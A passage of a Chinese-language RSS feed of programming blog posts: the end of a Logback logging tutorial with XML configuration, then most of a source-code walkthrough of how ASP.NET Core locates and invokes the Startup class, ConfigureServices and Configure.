class=&quot;hljs-string&quot;&gt;&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;fileNamePattern&lt;/span&gt;&amp;gt;&lt;/span&gt;error.%d{yyyy-MM-dd}.log&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;fileNamePattern&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;maxHistory&lt;/span&gt;&amp;gt;&lt;/span&gt;30&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;maxHistory&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;totalSizeCap&lt;/span&gt;&amp;gt;&lt;/span&gt;3GB&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;totalSizeCap&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;rollingPolicy&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;encoder&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;%d{yyyy-MM-dd HH:mm:ss} [ %t:%r ] - [ %p ] %m%n&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;encoder&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;filter&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;ch.qos.logback.classic.filter.ThresholdFilter&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;level&lt;/span&gt;&amp;gt;&lt;/span&gt;ERROR&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;level&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;filter&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;appender&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;level&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;debug&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;appender-ref&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;ref&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;stdout&quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;appender-ref&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;ref&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;D&quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;appender-ref&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;ref&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;E&quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;root&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;configuration&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;修改 Test 类的内容：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;java language-java hljs&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;Test&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; Logger logger = LoggerFactory.getLogger(Test.class);&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(String[] args)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;logger.debug(&lt;span class=&quot;hljs-string&quot;&gt;&quot;logback&quot;&lt;/span&gt;);&lt;br/&gt;logger.error(&lt;span class=&quot;hljs-string&quot;&gt;&quot;logback&quot;&lt;/span&gt;);&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;运行后，可以在 target 目录下看到两个文件：debug.log 和 errror.log。&lt;/p&gt;
&lt;img src=&quot;http://www.itwanger.com/assets/images/2020/11/java-logback-12.png&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;p&gt;到此为止，项目已经从 Log4j 切换到 Logback 了，过程非常的丝滑顺畅，嘿嘿。&lt;/p&gt;
&lt;h3 id=&quot;h04logback&quot;&gt;&lt;span&gt;04、Logback 手册&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;Logback 的官网上是有一份手册的，非常详细，足足 200 多页，只不过是英文版的。小伙伴们可以看完我这篇文章入门实操的 Logback 教程后，到下面的地址看官方手册。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;http://logback.qos.ch/manual/index.html&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果英文阅读能力有限的话，可以到 GitHub 上查看雷锋翻译的中文版：&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;https://github.com/itwanger/logback-chinese-manual&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;当然了，还有一部分小伙伴喜欢看离线版的 PDF，我已经整理好了：&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;链接:https://pan.baidu.com/s/16FrbwycYUUIfKknlLhRKYA 密码:bptl&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;实话实话吧，白嫖的感觉就是舒服，赶紧去下载吧！日常求个三连，谢谢你勤劳的手指，嘿嘿。&lt;/p&gt;
</description>
<pubDate>Mon, 02 Nov 2020 22:09:00 +0000</pubDate>
<dc:creator>沉默王二</dc:creator>
<og:description>Log4j 介绍过了，SLF4J 也介绍过了，那接下来，你懂的，Logback 就要隆重地登场了，毕竟它哥仨有一个爹，那就是巨佬 Ceki Gulcu。 就在昨天，老板听我说完 Logback 有多牛</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/qing-gee/p/13917480.html</dc:identifier>
</item>
<item>
<title>深入探究ASP.NET Core Startup初始化 - yi念之间</title>
<link>http://www.cnblogs.com/wucy/p/13886728.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wucy/p/13886728.html</guid>
<description>&lt;h4 id=&quot;前言&quot;&gt;前言&lt;/h4&gt;
&lt;p&gt;    Startup类相信大家都比较熟悉,在我们使用ASP.NET Core开发过程中经常用到的类，我们通常使用它进行IOC服务注册，配置中间件信息等。虽然它不是必须的，但是将这些操作统一在Startup中做处理，会在实际开发中带来许多方便。当我们谈起Startup类的时候你有没有好奇过以下几点&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;为何我们自定义的Startup可以正常工作。&lt;/li&gt;
&lt;li&gt;我们定义的Startup类中ConfigureServices和Configure只能叫这个名字才能被调用到吗？&lt;/li&gt;
&lt;li&gt;在使用泛型主机(IHostBuilder)时Startup的构造函数，为何只支持注入IWebHostEnvironment、IHostEnvironment、IConfiguration。&lt;/li&gt;
&lt;li&gt;ConfigureServices方法为何只能传递IServiceCollection实例。&lt;/li&gt;
&lt;li&gt;Configure方法的参数为何可以是所有在IServiceCollection注册服务实例。&lt;/li&gt;
&lt;li&gt;在ASP.NET Core结合Autofac使用的时候为何我们添加的ConfigureContainer方法会被调用。&lt;br/&gt;带着以上几点疑问，我们将在本篇文章中探索Startup的源码，来了解Startup初始化过程到底为我们做了些什么。&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;startup的另类指定方式&quot;&gt;Startup的另类指定方式&lt;/h4&gt;
&lt;p&gt;在日常编码过程中，我们通常使用UseStartup的方式来引入Startup类。但是这并不是唯一的方式，还有一种方式是在配置节点中指定Startup所在的程序集来自动查找Startup类，这个我们可以在GenericWebHostBuilder的构造函数源码中的找到相关代码[&lt;a href=&quot;https://github.com/dotnet/aspnetcore/blob/v3.1.9/src/Hosting/Hosting/src/GenericHost/GenericWebHostBuilder.cs#L92&quot;&gt;点击查看源码👈&lt;/a&gt;]相信熟悉ASP.Net Core启动流程的同学对GenericWebHostBuilder这个类都比较了解。ConfigureWebHostDefaults方法中其实调用了ConfigureWebHost方法，ConfigureWebHost方法中实例化了GenericWebHostBuilder对象，启动流程不是咱们的重点，所以这里只是简单描述一下。直接找到我们需要的代码如下所示&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cs&quot;&gt;//判断是否配置了StartupAssembly参数
if (!string.IsNullOrEmpty(webHostOptions.StartupAssembly))
{
    try
    {
        //根据你配置的程序集去查找Startup
        var startupType = StartupLoader.FindStartupType(webHostOptions.StartupAssembly, webhostContext.HostingEnvironment.EnvironmentName);
        UseStartup(startupType, context, services);
    }
    catch (Exception ex) when (webHostOptions.CaptureStartupErrors)
    {
       //此处省略代码省略
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里我们可以看出来，我们需要配置StartupAssembly对应的程序集，它可以通过StartupLoader的FindStartupType方法加载程序集中对应的类。我们还可以看到它还传递了EnvironmentName环境变量，至于它起到了什么作用，我们继续往下看。&lt;br/&gt;首先我们需要找到webHostOptions.StartupAssembly是如何被初始化的，在WebHostOptions的构造函数中我们找到了StartupAssembly初始化的地方[&lt;a href=&quot;https://github.com/dotnet/aspnetcore/blob/v3.1.9/src/Hosting/Hosting/src/Internal/WebHostOptions.cs#L27&quot;&gt;点击查看源码👈&lt;/a&gt;]&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cs&quot;&gt;StartupAssembly = configuration[WebHostDefaults.StartupAssemblyKey];
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;从这里也可以看出来它的值来于配置，它的key来自WebHostDefaults.StartupAssemblyKey这个常量值，最后我们找到了的值为&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cs&quot;&gt;public static readonly string StartupAssemblyKey = &quot;startupAssembly&quot;;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;也就是说只要我们给startupAssembly配置Startup所在的程序集名称，它就可以在程序集中查找Startup类进行初始化，如下所示&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cs&quot;&gt;public static IHostBuilder CreateHostBuilder(string[] args) =&amp;gt;
            Host.CreateDefaultBuilder(args)
                .ConfigureHostConfiguration(config=&amp;gt; {
                    List&amp;lt;KeyValuePair&amp;lt;string, string&amp;gt;&amp;gt; keyValuePairs = new List&amp;lt;KeyValuePair&amp;lt;string, string&amp;gt;&amp;gt;();
                    //配置Startup所在的程序集名称
                    keyValuePairs.Add(new KeyValuePair&amp;lt;string, string&amp;gt;(&quot;startupAssembly&quot;, &quot;Startup所在的程序集名称&quot;));
                    config.AddInMemoryCollection(keyValuePairs);
                })
                .ConfigureWebHostDefaults(webBuilder =&amp;gt;
                {
                    //这样的话这里就可以省略了
                    //webBuilder.UseStartup&amp;lt;Startup&amp;gt;();
                });
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;回到上面的思路，我们在StartupLoader类中查看FindStartupType方法，来看下它是通过什么规则来查找Startup的[&lt;a href=&quot;https://github.com/dotnet/aspnetcore/blob/v3.1.9/src/Hosting/Hosting/src/Internal/StartupLoader.cs#L224&quot;&gt;点击查看源码👈&lt;/a&gt;]精简之后的代码大致如下&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cs&quot;&gt;public static Type FindStartupType(string startupAssemblyName, string environmentName)
{
    var assembly = Assembly.Load(new AssemblyName(startupAssemblyName));
    //名称Startup+环境变量的类比如(StartupDevelopment)
    var startupNameWithEnv = &quot;Startup&quot; + environmentName;
    //名称为Startup的类
    var startupNameWithoutEnv = &quot;Startup&quot;;

    // 先查找包含名称Startup+环境变量的相关类，如果找不到则查找名称为Startup的类
    var type =
        assembly.GetType(startupNameWithEnv) ??
        assembly.GetType(startupAssemblyName + &quot;.&quot; + startupNameWithEnv) ??
        assembly.GetType(startupNameWithoutEnv) ??
        assembly.GetType(startupAssemblyName + &quot;.&quot; + startupNameWithoutEnv);

    if (type == null)
    {
        // 如果上述规则找不到，则在程序集定义的所有类中继续查找
        var definedTypes = assembly.DefinedTypes.ToList();

        var startupType1 = definedTypes.Where(info =&amp;gt; info.Name.Equals(startupNameWithEnv, StringComparison.OrdinalIgnoreCase));
        var startupType2 = definedTypes.Where(info =&amp;gt; info.Name.Equals(startupNameWithoutEnv, StringComparison.OrdinalIgnoreCase));

        var typeInfo = startupType1.Concat(startupType2).FirstOrDefault();
        if (typeInfo != null)
        {
            type = typeInfo.AsType();
        }
    }
    //最终返回Startup类型
    return type;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过上述代码我们可以看到在通过配置指定程序集时是如何查找指定规则的Startup类的，基本上可以理解为&lt;span&gt;先去查找名称为Startup+环境变量的类，如果找不到则继续查找名称为Startup的类，最终会返回Startup的类型传递给UseStartup方法。&lt;/span&gt;其实我们最常使用的UseStartup()方法最终也是转换成UseStartup(typeof(T))的方式，所以最终这两种方式走到了相同的地方，接下来我们步入正题，来一起探究一下Starup究竟是如何被初始化的。&lt;/p&gt;
&lt;h4 id=&quot;startup的构造函数&quot;&gt;Startup的构造函数&lt;/h4&gt;
&lt;p&gt;相信对Startup有所了解的同学们都比较清楚,在使用泛型主机(IHostBuilder)时Startup的构造函数只支持注入IWebHostEnvironment、IHostEnvironment、IConfiguration,这个在微软官方文档中&lt;a href=&quot;https://docs.microsoft.com/en-us/aspnet/core/fundamentals/startup?view=aspnetcore-3.1#the-startup-class&quot;&gt;https://docs.microsoft.com/en-us/aspnet/core/fundamentals/startup?view=aspnetcore-3.1#the-startup-class&lt;/a&gt;也有介绍,如果还有不熟悉这个操作的请先反思一下自己,然后在查阅微软官方文档。接下来我们就从源码着手，来探究一下它到底是如何做到的。沿着上述的操作，继续查看UseStartup里的代码找到了如下的实现[&lt;a href=&quot;https://github.com/dotnet/aspnetcore/blob/v3.1.9/src/Hosting/Hosting/src/GenericHost/GenericWebHostBuilder.cs#L235&quot;&gt;点击查看源码👈&lt;/a&gt;]&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cs&quot;&gt;//创建Startup实例
object instance = ActivatorUtilities.CreateInstance(new HostServiceProvider(webHostBuilderContext), startupType);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里的startupType就是我们传递的Startup类型，关于ActivatorUtilities这个类还是比较实用的，它为我们提供了许多帮助我们实例化对象的方法，在日常编程中如果有需要可以使用这个类。上面的ActivatorUtilities的CreateInstance方法的功能就是根据传递IServiceProvider类型的对象去实例化指定的类型对象，我们这里的类型就是startupType。它的使用场景就是，如果某个类型需要用过有参构造函数去实例化，而构造函数的参数可以来自于IServiceProvider的实例，那么使用这个方法就在合适不过了。上面的代码传递的IServiceProvider的实例是HostServiceProvider对象，接下来我们找到它的实现源码[&lt;a href=&quot;https://github.com/dotnet/aspnetcore/blob/v3.1.9/src/Hosting/Hosting/src/GenericHost/GenericWebHostBuilder.cs#L346&quot;&gt;点击查看源码👈&lt;/a&gt;]代码并不多我们就全部粘贴出来&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cs&quot;&gt;private class HostServiceProvider : IServiceProvider
{
    private readonly WebHostBuilderContext _context;
    public HostServiceProvider(WebHostBuilderContext context)
    {
        _context = context;
    }

    public object GetService(Type serviceType)
    {
        // 通过这里我们就比较清晰的看出，只有满足这几种情况下才能返回具体的实例，其他的都会返回null
        #pragma warning disable CS0618 // Type or member is obsolete
        if (serviceType == typeof(Microsoft.Extensions.Hosting.IHostingEnvironment)
            || serviceType == typeof(Microsoft.AspNetCore.Hosting.IHostingEnvironment)
        #pragma warning restore CS0618 // Type or member is obsolete
            || serviceType == typeof(IWebHostEnvironment)
            || serviceType == typeof(IHostEnvironment)
            )
        {
            return _context.HostingEnvironment;
        }
        if (serviceType == typeof(IConfiguration))
        {
            return _context.Configuration;
        }
        //不满足这几种情况的类型都返回null
        return null;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;span&gt;通过这个内部私有类我们就能清晰的看到为何Starup的构造函数只能注入IWebHostEnvironment、IHostEnvironment、IConfiguration相关实例了，HostServiceProvider类实现了IServiceProvider的GetService方法并做了判断，只有满足这几种类型才能返回具体的实例注入，其它不满足条件的类型都会返回null。因此在初始化Starup实例的时候，通过构造函数注入的类型也就只能是这几种了。&lt;/span&gt;最终通过这个构造函数初始化了Startup类的实例。&lt;/p&gt;
&lt;h4 id=&quot;configureservices的装载&quot;&gt;ConfigureServices的装载&lt;/h4&gt;
&lt;p&gt;接下来我们就来在UseStartup方法里继续查看是如何查找并执行ConfigureServices方法的，继续查看找到如下实现[&lt;a href=&quot;https://github.com/dotnet/aspnetcore/blob/v3.1.9/src/Hosting/Hosting/src/GenericHost/GenericWebHostBuilder.cs#L239&quot;&gt;点击查看源码👈&lt;/a&gt;]&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cs&quot;&gt;//传递startupType和环境变量参数查找返回ConfigureServicesBuilder
var configureServicesBuilder = StartupLoader.FindConfigureServicesDelegate(startupType, context.HostingEnvironment.EnvironmentName);
//调用Build方法返回ConfigureServices委托
var configureServices = configureServicesBuilder.Build(instance);
//传递services对象即IServiceCollection对象调用ConfigureServices方法
configureServices(services);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;从上述代码中我们可以了解到查找并执行ConfigureServices方法的具体步骤可分为三步，首先在startupType类型中根据环境变量名称查找具体方法返回ConfigureServicesBuilder实例，然后构建ConfigureServicesBuilder实例返回ConfigureServices方法的委托，最后传递IServiceCollection对象执行委托方法。接下来我们就来查看具体实现源码。&lt;br/&gt;我们在StartupLoader类中找到了FindConfigureServicesDelegate方法的相关实现[&lt;a href=&quot;https://github.com/dotnet/aspnetcore/blob/v3.1.9/src/Hosting/Hosting/src/Internal/StartupLoader.cs#L293&quot;&gt;点击查看源码👈&lt;/a&gt;]&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cs&quot;&gt;internal static ConfigureServicesBuilder FindConfigureServicesDelegate(Type startupType, string environmentName)
{
    //根据startupType和根据environmentName构建的Configure{0}Services字符串先去查找返回类型为IServiceProvider的方法
    //找不到在查找返回值为void类型的方法
    var servicesMethod = FindMethod(startupType, &quot;Configure{0}Services&quot;, environmentName, typeof(IServiceProvider), required: false)
        ?? FindMethod(startupType, &quot;Configure{0}Services&quot;, environmentName, typeof(void), required: false);
    //根据查找的到的MethodInfo去构建ConfigureServicesBuilder实例
    return new ConfigureServicesBuilder(servicesMethod);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过这里的源码我们可以看到在startupType类型里去查找名字为environmentName构建的Configure{0}Services的方法信息，然后根据查找的方法信息即MethodInfo对象去构建ConfigureServicesBuilder实例。接下里我们就来查询FindMethod方法的实现&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cs&quot;&gt;private static MethodInfo FindMethod(Type startupType, string methodName, string environmentName, Type returnType = null, bool required = true)
{
    //包含环境变量的ConfigureServices方法名称比如(ConfigureDevelopmentServices)
    var methodNameWithEnv = string.Format(CultureInfo.InvariantCulture, methodName, environmentName);
    //名为ConfigureServices的方法
    var methodNameWithNoEnv = string.Format(CultureInfo.InvariantCulture, methodName, &quot;&quot;);
    //方法是共有的静态的或非静态的方法
    var methods = startupType.GetMethods(BindingFlags.Public | BindingFlags.Instance | BindingFlags.Static);
    //查找包含环境变量的ConfigureServices方法名称
    var selectedMethods = methods.Where(method =&amp;gt; method.Name.Equals(methodNameWithEnv, StringComparison.OrdinalIgnoreCase)).ToList();
    if (selectedMethods.Count &amp;gt; 1)
    {
        //找打多个满足规则的方法直接抛出异常
        throw new InvalidOperationException(string.Format(&quot;Having multiple overloads of method '{0}' is not supported.&quot;, methodNameWithEnv));

    }
    //如果不存在包含环境变量的ConfigureServices的方法比如(ConfigureDevelopmentServices)，则直接查找方法名为ConfigureServices的方法
    if (selectedMethods.Count == 0)
    {
        selectedMethods = methods.Where(method =&amp;gt; method.Name.Equals(methodNameWithNoEnv, StringComparison.OrdinalIgnoreCase)).ToList();
        //如果存在多个则同样抛出异常
        if (selectedMethods.Count &amp;gt; 1)
        {
            throw new InvalidOperationException(string.Format(&quot;Having multiple overloads of method '{0}' is not supported.&quot;, methodNameWithNoEnv));
        }
    }

    var methodInfo = selectedMethods.FirstOrDefault();
    //如果没找到满足规则的方法，并且满足required参数，则抛出未找到方法的异常
    if (methodInfo == null)
    {
        if (required)
        {
            throw new InvalidOperationException(string.Format(&quot;A public method named '{0}' or '{1}' could not be found in the '{2}' type.&quot;,
                methodNameWithEnv,
                methodNameWithNoEnv,
                startupType.FullName));

        }
        return null;
    }
    //如果找到了名称一致的方法，但是返回类型和预期的不一致，也抛出异常
    if (returnType != null &amp;amp;&amp;amp; methodInfo.ReturnType != returnType)
    {
        if (required)
        {
            throw new InvalidOperationException(string.Format(&quot;The '{0}' method in the type '{1}' must have a return type of '{2}'.&quot;,
                methodInfo.Name,
                startupType.FullName,
                returnType.Name));
        }
        return null;
    }
    return methodInfo;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过FindMethod方法我们可以得到几个结论，首先ConfigureServices方法的名称可以是包含环境变量的名称比如(ConfigureDevelopmentServices)，其次方法可以为共有的静态或非静态方法。FindMethod方法是真正执行查找的逻辑所在，如果找到相关方法则返回MethodInfo。&lt;span&gt;FindMethod查找的方法名称是通过methodName参数传递进来的，我们标注的注释代码都是直接写死了ConfigureServices方法，只是为了便于说明理解，但其实FindMethod是通用方法，接下来我们要讲解的内容还会涉及到这个方法，到时候关于这个代码的逻辑我们就不会在进行说明了，因为是同一个方法，希望大家能注意到这一点。&lt;/span&gt;&lt;br/&gt;通过上面的相关方法，我们了解到了是通过什么样的规则去查找到ConfigureServices的方法信息的，我们也看到了ConfigureServicesBuilder正是通过查找到的MethodInfo去构造实例的，接下来我们就来查看下ConfigureServicesBuilder的实现源码[&lt;a href=&quot;https://github.com/dotnet/aspnetcore/blob/v3.1.9/src/Hosting/Hosting/src/Internal/ConfigureServicesBuilder.cs&quot;&gt;点击查看源码👈&lt;/a&gt;]&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cs&quot;&gt;internal class ConfigureServicesBuilder
{
    //构造函数传递的configureServices的MethodInfo
    public ConfigureServicesBuilder(MethodInfo configureServices)
    {
        MethodInfo = configureServices;
    }

    public MethodInfo MethodInfo { get; }
    public Func&amp;lt;Func&amp;lt;IServiceCollection, IServiceProvider&amp;gt;, Func&amp;lt;IServiceCollection, IServiceProvider&amp;gt;&amp;gt; StartupServiceFilters { get; set; } = f =&amp;gt; f;
    //Build委托
    public Func&amp;lt;IServiceCollection, IServiceProvider&amp;gt; Build(object instance) =&amp;gt; services =&amp;gt; Invoke(instance, services);
    private IServiceProvider Invoke(object instance, IServiceCollection services)
    {
        //执行StartupServiceFilters委托参数为Func&amp;lt;IServiceCollection, IServiceProvider&amp;gt;类型的委托方法即Startup
        //返回了Func&amp;lt;IServiceCollection, IServiceProvider&amp;gt;委托，执行这个委托需传递services即IServiceCollections实例返回IServiceProvider类型
        return StartupServiceFilters(Startup)(services);
        IServiceProvider Startup(IServiceCollection serviceCollection) =&amp;gt; InvokeCore(instance, serviceCollection);
    }

    private IServiceProvider InvokeCore(object instance, IServiceCollection services)
    {
        if (MethodInfo == null)
        {
            return null;
        }
        // 如果ConfigureServices方法包含多个参数或方法参数类型不是IServiceCollection类型则直接抛出异常
        // 也就是说ConfigureServices只能包含一个参数且类型为IServiceCollection
        var parameters = MethodInfo.GetParameters();
        if (parameters.Length &amp;gt; 1 ||
            parameters.Any(p =&amp;gt; p.ParameterType != typeof(IServiceCollection)))
        {
            throw new InvalidOperationException(&quot;The ConfigureServices method must either be parameterless or take only one parameter of type IServiceCollection.&quot;);
        }
        //找到ConfigureServices方法的参数，并将services即IServiceCollection的实例传递给这个参数
        var arguments = new object[MethodInfo.GetParameters().Length];
        if (parameters.Length &amp;gt; 0)
        {
            arguments[0] = services;
        }
        // 执行返回IServiceProvider实例
        return MethodInfo.InvokeWithoutWrappingExceptions(instance, arguments) as IServiceProvider;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;看完ConfigureServicesBuilder类的实现逻辑，关于通过什么样的逻辑查找并执行ConfigureServices方法的逻辑就非常清晰了。&lt;span&gt;首先是查找ConfigureServices方法，即包含环境变量的ConfigureServices方法名称比如(ConfigureDevelopmentServices)或名为ConfigureServices的方法，返回的是ConfigureServicesBuilder对象。然后执行ConfigureServicesBuilder的Build方法，这个方法里包含了执行ConfigureServices的规则，即ConfigureServices只能包含一个参数且类型为IServiceCollection，然后将当前程序中存在的IServiceCollection实例传递给它。&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&quot;configure的装载&quot;&gt;Configure的装载&lt;/h4&gt;
&lt;p&gt;我们常使用Startup的Configure方法去配置中间件，默认生成的Configure方法为我们添加了IApplicationBuilder和IWebHostEnvironment实例，但是其实Configure方法不仅仅可以传递这两个参数，它可以通过参数注入在IServiceCollection中注册的所有服务，究竟是如何实现的呢，接下来我们继续探究UseStartup方法查找源码查看想实现&lt;br/&gt;[&lt;a href=&quot;https://github.com/dotnet/aspnetcore/blob/v3.1.9/src/Hosting/Hosting/src/GenericHost/GenericWebHostBuilder.cs#L267&quot;&gt;点击查看源码👈&lt;/a&gt;],我们抽离出来核心实现如下&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cs&quot;&gt;//和ConfigureServices查找方式类似传递Startup实例和环境变量
ConfigureBuilder configureBuilder = StartupLoader.FindConfigureDelegate(startupType, context.HostingEnvironment.EnvironmentName);
services.Configure&amp;lt;GenericWebHostServiceOptions&amp;gt;(options =&amp;gt;
{
    //通过查看GenericWebHostServiceOptions的源码可知app其实就是IApplicationBuilder实例
    options.ConfigureApplication = app =&amp;gt;
    {
        startupError?.Throw();
        //执行Startup.Configure，instance为Startup实例
        if (instance != null &amp;amp;&amp;amp; configureBuilder != null)
        {  
            //执行Configure方法传递Startup实例和IApplicationBuilder实例
            configureBuilder.Build(instance)(app);
        }
    };
});
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们通过查看GenericWebHostServiceOptions的源码可知ConfigureApplication属性的类型为Action也就是说app参数其实就是IApplicationBuilder接口的实例。通过上面这段代码可以看出，主要逻辑就是调用StartupLoader的FindConfigureDelegate方法，然后返回ConfigureBuilder建造类，然后构建出Configure方法并执行。首先我们来查看FindConfigureDelegate的逻辑实现&lt;br/&gt;[&lt;a href=&quot;https://github.com/dotnet/aspnetcore/blob/v3.1.9/src/Hosting/Hosting/src/Internal/StartupLoader.cs#L276&quot;&gt;点击查看源码👈&lt;/a&gt;]&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cs&quot;&gt;internal static ConfigureBuilder FindConfigureDelegate(Type startupType, string environmentName)
{
